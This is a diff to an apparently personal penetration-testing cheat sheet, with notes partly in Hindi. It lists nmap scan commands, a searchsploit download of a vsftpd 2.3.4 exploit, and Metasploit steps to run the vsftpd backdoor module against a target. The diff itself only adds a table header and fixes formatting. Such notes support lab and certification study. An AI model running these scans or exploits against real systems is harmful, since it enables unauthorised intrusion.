@@ -37,6 +37,8 @@
 | 30 | **nmap --script smb-os-discovery.nse [Target IP Address]** |  | determine the OS, computer name, domain, workgroup, and current time over the SMB protocol  |
 | 31 | **nmap -Pn -sS -A -oX Test 10.10.1.0/24**  |  |  |
 | 32  | `locate filename` |  |  |
+
+| Sr. No | Nmap Command | क्यों Use करते हैं | क्या पता चलता है |
 | --- | --- | --- | --- |
 # All port command
 |  searchsploit -m unix/remote/49757.py | aise hum doenload krege exploit ko   or use google github |
@@ -79,7 +81,7 @@ use exploit/unix/ftp/vsftpd_234_backdoor
 set RHOSTS <target>
 run
 	 Exploit FTP Backdoor (vsftpd 2.3.4)
-use exploit/unix/ftp/vsftpd_234_backdoor	Exploits vsFTPd 2.3.4 backdoor vulnerability.
+use exploit/unix/ftp/vsftpd_234_backdoor	Exploits vsFTPd 2.3.4 backdoor vulnerability. |  |  |
 	
 2] ssh (22)	
 nmap -sV -sC --script vuln <target_ip> -p 22	ssh port scan with vuln script
